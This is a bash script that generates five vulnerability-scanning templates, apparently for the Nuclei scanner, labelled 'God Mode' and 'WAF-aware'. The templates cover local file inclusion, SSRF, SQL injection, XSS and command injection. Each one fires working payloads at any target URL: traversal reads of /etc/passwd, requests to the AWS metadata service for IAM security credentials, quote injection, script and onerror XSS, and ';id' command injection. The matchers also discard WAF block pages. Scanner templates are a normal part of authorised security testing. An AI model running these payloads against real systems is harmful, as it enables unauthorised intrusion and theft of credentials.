#!/bin/bash
# K70n0s510 GOD MODE BUILDER (WAF-AWARE)
BASE_DIR="$HOME/K70n0s510_templates/owasp-2025"
mkdir -p "$BASE_DIR/A03-injection/lfi-nuclear"
mkdir -p "$BASE_DIR/A01-access-control/ssrf-nuclear"
mkdir -p "$BASE_DIR/A03-injection/sqli-godmode"
mkdir -p "$BASE_DIR/A03-injection/xss-nuclear"
mkdir -p "$BASE_DIR/A03-injection/rce-nuclear"

echo "💉 Injecting WAF-Aware Steroids..."

# 1. LFI GOD MODE
cat <<EOF > "$BASE_DIR/A03-injection/lfi-nuclear/lfi-linux-godmode.yaml"
id: K70n0s510-lfi-linux-godmode
info:
  name: Linux LFI God Mode
  author: K70n0s510
  severity: high
  tags: lfi,linux,fuzz
http:
  - method: GET
    path:
      - "{{BaseURL}}/?file=../../../../etc/passwd"
      - "{{BaseURL}}/?file=../../../../etc/passwd%00"
      - "{{BaseURL}}/?path=/proc/self/root/etc/passwd"
    matchers-condition: and
    matchers:
      - type: regex
        regex: ["root:.*:0:0:"]
      - type: word
        words: ["AkamaiGHost", "Access Denied", "Cloudflare"]
        negative: true
EOF

# 2. SSRF GOD MODE
cat <<EOF > "$BASE_DIR/A01-access-control/ssrf-nuclear/ssrf-aws-godmode.yaml"
id: K70n0s510-ssrf-aws-godmode
info:
  name: AWS SSRF God Mode
  author: K70n0s510
  severity: critical
  tags: ssrf,aws,cloud
http:
  - method: GET
    path:
      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    matchers-condition: and
    matchers:
      - type: word
        words: ["ami-id", "instance-id"]
      - type: word
        words: ["AkamaiGHost", "Access Denied"]
        negative: true
EOF

# 3. SQLi GOD MODE
cat <<EOF > "$BASE_DIR/A03-injection/sqli-godmode/sqli-error-godmode.yaml"
id: K70n0s510-sqli-error-godmode
info:
  name: SQLi Error God Mode
  author: K70n0s510
  severity: high
  tags: sqli,error
http:
  - method: GET
    path:
      - "{{BaseURL}}/?id=1'"
      - "{{BaseURL}}/?id=1\""
    matchers-condition: and
    matchers:
      - type: word
        words: ["SQL syntax", "MySQL result", "ORA-00933"]
      - type: word
        words: ["AkamaiGHost", "Access Denied"]
        negative: true
EOF

# 4. XSS GOD MODE
cat <<EOF > "$BASE_DIR/A03-injection/xss-nuclear/xss-polyglot-godmode.yaml"
id: K70n0s510-xss-godmode
info:
  name: XSS Polyglot God Mode
  author: K70n0s510
  severity: medium
  tags: xss,polyglot
http:
  - method: GET
    path:
      - "{{BaseURL}}/?q=<script>alert(1)</script>"
      - "{{BaseURL}}/?search=<img src=x onerror=alert(1)>"
    matchers-condition: and
    matchers:
      - type: word
        words: ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
      - type: word
        part: header
        words: ["text/html"]
      - type: word
        words: ["AkamaiGHost", "Access Denied"]
        negative: true
EOF

# 5. RCE GOD MODE
cat <<EOF > "$BASE_DIR/A03-injection/rce-nuclear/rce-godmode.yaml"
id: K70n0s510-rce-godmode
info:
  name: RCE God Mode
  author: K70n0s510
  severity: critical
  tags: rce,fuzz
http:
  - method: GET
    path:
      - "{{BaseURL}}/?cmd=cat+/etc/passwd"
      - "{{BaseURL}}/?ip=127.0.0.1;id"
    matchers-condition: and
    matchers:
      - type: regex
        regex: ["root:.*:0:0:", "uid=[0-9]+.*gid=[0-9]+"]
      - type: word
        words: ["AkamaiGHost", "Access Denied"]
        negative: true
EOF

echo "✅ GOD MODE INSTALLED (WAF Protected)."
